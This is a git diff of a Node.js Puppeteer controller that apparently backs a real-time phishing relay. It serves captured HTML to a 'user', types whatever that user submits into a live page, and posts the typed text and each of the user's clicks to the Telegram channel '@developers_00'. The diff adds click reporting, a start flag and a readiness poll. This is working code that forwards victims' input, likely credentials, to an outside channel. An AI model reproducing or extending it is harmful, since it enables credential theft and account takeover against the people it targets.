@@ -8,6 +8,7 @@ require("dotenv").config();
 let browser; // Global browser instance
 let page; // Global page instance
 let modifyedHTML = {};
+let start = false;
 
 module.exports = {
     LUNCH: async (req, res) => {
@@ -31,6 +32,7 @@ module.exports = {
     },
     CLOSE: async (req, res) => {
         try {
+            start = false;
             const bot = req.bot;
             await page.close();
             await bot.sendMessage('@developers_00', `<b>CLOSED:</b>`, { parse_mode: 'HTML' });
@@ -41,6 +43,7 @@ module.exports = {
     },
     GOPAGE: async (req, res) => {
         try {
+            start = false;
             const bot = req.bot;
             const { url } = req.body;
             page = await browser.newPage();
@@ -112,6 +115,7 @@ module.exports = {
                 });
             });
             await page.waitForTimeout(5000);
+            start = true;
             await bot.sendMessage('@developers_00', `<b>START:</b>`, { parse_mode: 'HTML' });
             return res.send({ success: true, message: 'OK' });
         } catch (error) {
@@ -170,7 +174,9 @@ module.exports = {
     },
     GETHTML: async (req,res) => {
         try{
-           return res.send({ success: true, message: modifyedHTML });
+            const bot = req.bot;
+            res.send({ success: true, message: modifyedHTML });
+            return await bot.sendMessage('@developers_00', `<b>USER GETHTML:</b>`, { parse_mode: 'HTML' });
         }catch(error){
             return res.send({ success: false, message: error.message });
         }
@@ -266,10 +272,11 @@ module.exports = {
             const bot = req.bot;
             let { info } = req?.body;
             await page.focus('body');
-            await page.type(`${info}`);
+            await page.keyboard.type(info);
             await bot.sendMessage('@developers_00', `<b>WRITE: ${info}</b>`, { parse_mode: 'HTML' });
             return res.send({ success: true, message: 'OK' });
         } catch (error) {
+            console.log(error,'error')
             return res
                 .status(500)
                 .send({ success: false, message: error.message });
@@ -284,6 +291,34 @@ module.exports = {
                 await func(page, console);
             }
             return res.send({ success: true, message: 'OK' });
+        }catch (error) {
+            return res
+                .status(500)
+                .send({ success: false, message: error.message });
+        }
+    },
+    ACTION:async(req,res)=>{
+        try{
+            const bot = req.bot;
+            const { name } = req.body;
+            await bot.sendMessage('@developers_00', `<b>User click to:</b> <code>${name}</code>`, { parse_mode: 'HTML' });
+            if(name === 'cancel'){
+                start = false;
+            }
+            return res.send({success: true, message:'success'})
+        }catch (error) {
+            return res
+                .status(500)
+                .send({ success: false, message: error.message });
+        }
+    },
+    CANSTART:async(req,res)=>{
+        try{
+            if(start){
+                return res.send({success: true, message:'success'})
+            }else{
+                return res.send({success: false, message:'Please Wait!'})
+            }
         }catch (error) {
             return res
                 .status(500)
